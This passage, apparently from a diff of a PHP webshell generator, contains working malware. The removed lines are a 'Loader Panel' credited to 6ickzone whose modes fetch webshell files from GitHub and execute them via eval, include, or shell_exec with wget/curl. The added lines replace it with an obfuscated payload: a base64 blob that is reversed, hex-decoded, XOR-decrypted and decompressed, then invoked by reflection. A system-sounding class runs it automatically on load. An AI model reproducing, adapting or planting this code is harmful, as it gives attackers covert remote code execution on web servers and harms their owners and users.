mJkNjZiY2E5NDYyYjVhYThmNzEwZjNlZWRlNmFkMTg1OWYwMDk1N2Y0YjA3YzgxMGJjMmYxNWQ2MzBjZWQ3NGYxMDczZGFmYTM1NjJmMWFhNjQ5OWJhZDM3NDgwN2VkYzY0YTI0Njc0YTg2NTU5Zjc4NTVhNDY3OWQ4ZDNiYjJjOGVmYTI0NzI0NWU4ZWNkNDZlZmQzMzIwNDY3ZmI1MzM0ZmMzYTg3ODQ4YThjN2U1OGQ4MGEyN2FhNDdkMWE0ODRiMGJjM2YyNTdiZTAyMDgzNDA3NGJhZGIwNzIyOWJjZmJlNjE5OTNlODMzNzVlYjliMTBkZTM1MTEzZDZlOGNlYjUxMjAwNDk1Y2ViM2Y3MTI1NTQxZWFhMGYzMThmYTBkN2IzMDMzYzcwNzM0MzY2NTg1MGNlNmYxODcwMzBmMDQ5NWExZjhiMzhmZGYwNWVkZDVhZjcyNzUzNzE3NjA2ZjI1MWYwZDY3MjNkY2U5YTIxYjBjNDdhNTA0Y2RiMmZlYmQ0ZTJmZGIyODJlNmNmNDlkMDUzYTY1M2E1ZTA2YjExMThiMDNmNTQ4NzJlMmI5OTEzZDc5YWU3ODIyNmUzYThlMmU4NDU0NWNjMGZiNTUxNzVkYTI0MDRmMTUzOTdlYTcwMGRhYWM4ZmFkMTZkODE2ZDg5YzliZDViODZkMzhhN2E2NTk0Zjc4NmMzNjA0MGMzNzQ1ZDljY2NjNGJkODY5ZWY2OGI4MzMxYjNhZDNlZjE0MTM0ZWI3MjVjMmM3OGI2YjM5MmI5MjFjOWEzMWQ1YzA1MzdkMGUxNDdkYjQ3NzVkNzQ4NzJhNjQ0Njg4ZTZiMDVjODc4OTQwYWNhYWU4ZWNlMzIyNDAxOWE2MTVlNzRlY2I5MjcyN2JlMDkzNGQxYTRmNWNlMzg1ZmU3NDEyZmRhNTExMzc4NGRkMjYyNjk2NWM4MTVkYWE1YzI3NWNiNzA0ZmRkM2RjYWEzZjEzMDU5NWFjNWQ4YzBiODA0MjlhMzBkOWU3Mzk2MWRmMTJkZjQzOThjNzYxZTM3YTFjMzZhODAxM2E4YjlmMDlhZjZjYTY3ZmUxNGI5ZTMxZTljN2Y5YTE1NTU3NjNjMTQ5ZDNmOWQ1MGRjODdhNWM3ZGI2MDMyOWNjZjdiYzcwNjcwMDE4MDE3ZDI4YTBhZDY5NWRkNmVjZTUwZWFkMWQwYzJmNDRmM2E0NzM3MzViNzQ5ZTk5NTc2NmUyNzZkYTNmZmUzNzdiMGQ2YTI3ZTlmODM1ZDEwODNjMmU4NzhlMTVmMmE5ZTc4MTNiZjgxOTAzODJlYzZjNDFkMWU1ZmZhZjRhZmExYmU4OTA0YzgxODY2YTg5ODhiYWNhZGQzMDg2Mzk1MjgzZmRkMjExZWQ2YThhNzUyNzZhY2FmYmYzYjFjMTJhNDJlNjYxMWEyYmZjZWQ1NDI3MzhmNTY4NmU1NTI5MDZjNmVhNTA3OTA3OWQ3MzkxYjExMTI2Yzc2M2E0ZjJjYmQ5YmM5NGNlMmNiOGZjMDk0NWEwNDhlODI1ZDYzOGI1ODg2NzlhZGU4N2E4ODg5NjU1NWUxYjAyODAxMmZiMTcxZTMwZWNkZTc2NTcwNWY3NjM1MjgwN2Q3MDE0ZjhiOWE5ZGVkNTI2ZTEwOTRlZTJhMjVmNDBhZGFhNTRkZDIzZGYzMTE4NGE2OGZlY2I2N2VlZGFmYzRmNzQzMTkwMmQwNjAyMjNiYjgyNDZkYzAwMDJiMzdiZTQ2OTVhMTQ2YjBiZWVhNzhjN2U2ZDZjM2RhMDQ5NjgwZDkyMDA5ZmU2NzZjNzQ4OGMyODhmZWY4NDU2Y2JiZmMyNjZkMTliZDEyMmRkZTVjNGEyOWY1ZWI1MGMzYTdjM2E3ZTAyY2ExM2ZlZDFkMTliMTU3ODBkN2I4YzNkY2Q1ZjMwNjlmNzYxMGNhNWYyZTc1OTQ4NjBlNjViNmEzZDdmZTIwOGNmNmRkN2I0ZTEwZDk1Y2Q3ZWI5OGZmZWQ5MWZiNTU5ZmYwZGZlYTA2YzMzNDQyMjA1MGQxMGU5YzAzMTk3NDhhZTUxOTc0NjUwMzVkYmE4NTE2YmJmZjZmNThhZGEwZjk2NWJiMDlkMmI5OGVlMDc2N2FiMDhkZGVmNzVlMmYxMDUyMTk2MzVmMDViNjUxOGY1NDkzN2JlYzNkYWZkODcwMTVlNGVlMmYzYTE3ODU5OGY5OWIxM2IzMjZiOWI1ZGRlN2FkNmNjYWIzZjgyZDgyZGZkY2I3ZjY4ODAyMjI3ZTdhYmQ3OTgyN2QxNjg2OTY3MGM2ODU1NzhjOTdmOTZhNGIxMmNlNjQxYTc1NGFhN2JmNDNjMDc1ZGI2OTgzZTU5OGE0MTJiMmY3YWE1Zjg1ZTVhODlmZjE2N2M3MDczNGE3MTU0ZWZhOTcxY2U3YmE5ZGEzMDZjZTA0OGM0ZTIzY2NkNDc2MWI1NmI2M2RiNGFmMDQxZDFhNjYwZDNlYTYwMGZkNWJhZmY3OTViMmY1ODY2OTk4OWQyYzA2YzJlZjcyOGY4NGUyOWJhMmYyYzIzZTJjMjE0MzhhMGE3YzVlY2JmMzgwYzdkNjUzM2Y1YThlZmJmZTRjNTY3OWI0OTM0OTk1OWIzYjhhZjFmYmM5NTdiOTg1NDAzZDZlYTM0YWJkMTVkMjQyY2VlNmQ5OWU5ZTQ3Y2I2OTkwZWJmZDAyNDQ1N2U3MzUwOWQ0ODU4MWIyNDJiMjI3ZmMzMmEzNDMzODRjMzU5ODQzZDUwOWM4NTU5MzVlZDVjZjNlOGY0ZTY3YWNlYjRlNWQxM2MzNGM4MTc5MWUyNzNlNzM4ODBhN2U2YjZlM2FmOTUyZWI1NzZiZTJhYjE4NWM5ZDY0ODQ3MWU3N2Q2MmYxYjUzNWEzMDFmYjNlYjM1ZGM1NGJiODFiOTU5OWZhYzhlYjAyYTFiZDllNDc0MmFjYTIyZjYyZDg1YWQ4ZjgzZDUzMTVkMjIzNWYwOWI5ZTQ3OTY0YjI5OTdlMzQ3NTljMTY0MzU3ZDdlNjMwN2RmYmIzNDJiMThkZmFkMTU2YjdmNGIxZWQxNmNkMTY5NWJjNmVlYmQyY2I2NWQzYmVkODRmMDIzYzllMjdiMjA4MzhmMWFlYzZkZGQ4NDRmMmFlYmMyMWM4ZTIwYjk3MmRmNTgzYTJmZmUyNTBiM2U2MGNjYWExZGE2ZDMxMjc2MzQ4ZGMxYmFiNzg4MGRjNDk2Yzg3MTQyZTQxYjhkODgzYjcxYTgyM2RhZmIzNjg2MTdlN2VkZjIyNmMxNGRhMTMzNDJiZmQ1NzI4MWNiMzM2ZTAyYWJlNWE3YTI1MDVjOGNhY2QzYzEzMzRmZDQwYTFiMzJiYzNkMjc4MTQzZjgyN2JmZThkMjFlZGUwNmYyMjI3YjRiZjA5YzEzNjJjYTUzYzdiMjcyZjA0MDYzOTE0NTc4MDllN2Y3MTAxOTMxOWRhM2U3YzUyYTkyZDc1NTAxYzQxNjViZjc3Y2JiNDhlZTY3YTc0ZjEyNmY4NjAzYTcyMDg5MWM4MjA5ZDRmNjA5ZmVkNjZjMzM1ZGQxNWVkMGVhYTdiYmM0OGRhZTUyNTU2OGY2MTc3ZDZkNGE2N2ViM2NiMjdkNzNkNTRjNGY0MzA1NmEyYzYzMjAzYTEwNzExNTJmZTkwNGE4MDRhNmUzNzg5MDQ3YWZhODFlYjNlODE0YjZlZTcwOTJlNWU0NDg0NzEwN2Y4MTQ4YmVjNTViNTcyZDBiOWUwNjQzZGI0MmI4ZTYwYzc4NTc5Njc5ODgzZDY1ZjMyMjAwYzMyYTk3NjA5Y2QwYjQ1YzBiYWY5MDhjMTZhNWZlMzBjNGIzNzY2MTJhNzM5NDYwOWExNjQzMDI5OGI5MjE0ZjFlNmI4NjA2MjVhNzI2ZGE3ODljODRiMjYwMGYxZTI5OThmOTc1NWZlYjNjMTYxMjQyNWNiNTc1NGYwZDcwMmY2M2Y2MzQ3MzdkZjJmYjY3NzM5MDk1YjE5ZjFkMzI4MjllMTVhNzBmNGE4OTgwZGNmNTdlOTEyY2ZkNTY5MGViNWE0MjVjODg2Y2UyNzdlNGQ1OGEzYTBkZGU1YWM5N2I4MDQ0MmQzODU3OTI4M2UwNWE2OTc3NTc3NDIxZjdiNTViZTBiYzcyYTFlMWQwZGNmNDQ3NDM5OWViY2IzNjRlNjI0ODA2MGY2NGRlNmNjODg2YzFhZmI4NDE1MDdmZjFiZTM5MTNiYTg3ZTVhMTM0MWQ3MzliNDU3NmQ3YTliZjM2MTVkYmZhNmQyY2EwZTAzYjljM2EyMDAxMzAzYjFlMmEwMzI3YTgwMzVhOWIyNGUxMmViOWNkMWIwOTMwNTU5OTY2ZTc1ZWRmZDc4MzBlZjBjNTRiMTk3OTMzMTE5MmFhMDBkNGE2OTEwMzI2NDg3MWJkM2FmOWVlMDcyOTcyZjQxZmRhMmUwNDRlZjIxZmQ4OWJhYjVjMTBiNGY0NGFlM2Q4Y2YwMjRkOTE1YTU0YzM4NDAxMDhlNmVkYzliZWE1M2VkOWNmMWY1NzIwODAzYjhhNWY5ZjkyZTRhY2MxMTA4MmJhNTBhMjczMzQ0OTBmZTM4MmU5OTE4ZDI4MGIyNGViN2QyMWIwYTg4ZWIzYjRlOWExOWEzMDJhNDk1MjhmYTI1N2EzNDAwOTBkNzQ1ODcwMzViODdhYWMzYWYwNWVlODFkZTc1OWJhODViNWI3YTQwNjAwMTUzYTBhMDA2NDA2MTEzNzYyZGVmNWFkMjc5YTYyNmIzMDY5MzllMDAxMzIxYWUxNWJhYTlkYTY4YzE0ZDhiNTc4YjY4ZTBjMjFlM2YyOGJjMTNiMDMyZWQwZGY5ZGIxYWE4NWY4ZTAxZTZlMWNmN2E2YzQ1YWYzNGNiM2JlZTM4YWMzOTI0Zjc3Nzk0ZDk1MDI1NjBkNWI0YTdlOTNlNmI1YWI4ODU0M2UzOTEwMmM0ZGRjYTIwMzU3ZTA4NWUyOGI3ZWI0NTAwZDk2Mzc0YTI3MTAxYzNmZmE3NGZiYTk1OTkxMjlmNjgzYjM1MWFhODRhZWZhYmU2MGY3YTc5N2NiOTE5YmNjODEwZDg2OThiODM5ZDI1NzAxMTU0MGFjMmQ3MjZkZGYxZWJlYjlmOWQ0YTg3YjVmMzM0ZTJhOGIzMmE0YjBlNGEzOGY4ODc1ODE0ZTZmYzY1OTQ2MjhkZWVhNTIzNjNkMGJhMjJiNmI5YTBhOGRmN2NlYTMyYWIzZmRkNmU1NDM5NWYzMTVkNTlhZmZhYzE2Yjk0MWI0OTIz';
+        $Xfqju = hex2bin(strrev(base64_decode($ZCCjn)));
+        $o = new self();
+        $tqEuY = $o->oEPSJN() . $o->egxSDd() . $o->jifCaX();
+        $tcMrv = $o->vzmuyB() . $o->AmhmQN() . $o->DJncfp();
+        if (md5($tcMrv) !== '9bdbd9958a3da2272fc03d5cd89df03b') { return; }
+        $cqRCz = '';
+        $kl = strlen($tqEuY);
+        for ($i=0, $len = strlen($Xfqju); $i < $len; $i++) {
+            $cqRCz .= chr(ord($Xfqju[$i]) ^ ord($tqEuY[$i % $kl]));
         }
-        if (file_exists($tmp_path) && filesize($tmp_path) > 0) include_once($tmp_path);
-        break;
-
-    // --- Loader 4: Cache File ---
-    case "cache":
-        $tmp = 'cache_ym.php';
-        $url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/yami.php';
-        if (!file_exists($tmp) || filesize($tmp) < 10) {
-            $code = file_get_contents($url);
-            file_put_contents($tmp, $code);
+        $res = @gzuncompress($cqRCz);
+        if ($res) {
+            $ref = new ReflectionMethod(__CLASS__, 'eqEugdvR');
+            $ref->setAccessible(true);
+            $ref->invoke(new self(), $res);
         }
-        include($tmp);
-        unlink($tmp);
-        break;
-
-    // --- Loader 5: cURL v2 ---
-    case "curlv2":
-        $Url = 'https://raw.githubusercontent.com/6ickzone/0x6NyxWebShell/refs/heads/main/void.php';
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $Url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        $output = curl_exec($ch);
-        curl_close($ch);
-        if ($output) {
-            eval('?>'.$output);
-        }
-        break;
-
-    // --- Loader 6: WGET + Include ---
-    case "wget":
-        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/simplebypass.php';
-        $tmp_file = '/tmp/sess_'.md5($url).'.php';
-        if(is_executable('/usr/bin/wget')) {
-            $command = "/usr/bin/wget -q -O $tmp_file $url";
-        } else {
-            $command = "/usr/bin/curl -s -o $tmp_file $url";
-        }
-        @shell_exec($command);
-        if (file_exists($tmp_file) && filesize($tmp_file) > 0) {
-            include($tmp_file);
-            unlink($tmp_file);
-        } else {
-            echo "Error: Failed to download file or shell_exec is disabled.";
-        }
-        break;
-
-    // --- Loader 7: Socket ---
-    case "socket":
-        $host = 'raw.githubusercontent.com';
-        $path = '/6ickzone/0x6ickShell-Manager/refs/heads/main/yami.php';
-        $port = 443;
-        $fp = @fsockopen("ssl://" . $host, $port, $errno, $errstr, 10);
-        if ($fp) {
-            $out = "GET $path HTTP/1.1\r\n";
-            $out .= "Host: $host\r\n";
-            $out .= "Connection: Close\r\n\r\n";
-            fwrite($fp, $out);
-            $response = '';
-            while (!feof($fp)) {
-                $response .= fgets($fp, 128);
-            }
-            fclose($fp);
-            $body = substr($response, strpos($response, "\r\n\r\n") + 4);
-            if (!empty($body)) {
-                eval("?>$body");
-            } else {
-                echo "Error: Failed to get content via socket.";
-            }
-        } else {
-            echo "Error: Could not open socket to $host ($errstr)";
-        }
-        break;
-
-    // --- Contact / Credits ---
-    case "telegram":
-        echo '<div style="font-family: monospace; text-align: center; margin-top: 20px;">';
-        echo '<strong>WARNING! This tools auto generated by 6ickzone - GajeProject.</strong><br><br>';
-        echo 'Contact Author:<br>';
-        echo '<a href="https://t.me/Yungx6ick" target="_blank" style="color: lightblue; text-decoration: underline;">6ickzone</a>';
-        echo '<br><br><a href="?m=h" style="color: white;">&larr; Back to Menu</a>';
-        echo '</div>';
-        break;
-
-    // --- MAIN MENU ---
-    default:
-        echo "<h3>Loader Panel</h3>";
-        echo "Select loader mode via ?m=<br>";
-        echo "- <a href='?m=curl'>curl</a><br>";
-        echo "- <a href='?m=curlman'>curlman (refactored)</a><br>";
-        echo "- <a href='?m=tmp'>tmp</a><br>";
-        echo "- <a href='?m=cache'>cache</a><br>";
-        echo "- <a href='?m=curlv2'>curlv2</a><br>";
-        echo "- <a href='?m=wget'>wget</a><br>";
-        echo "- <a href='?m=socket'>socket</a><br>";
-        echo "- <a href='?m=telegram'>Author / Contact</a><br>";
-        echo "<hr>To return to this menu, use <a href='?m=h'>?m=h</a>";
+    }
+}
+if (!defined('_SYS_LOADED')) {
+    define('_SYS_LOADED', true);
+    Core_Suaue_Mod::init_YwXe();
 }
 ?>
 PHP;
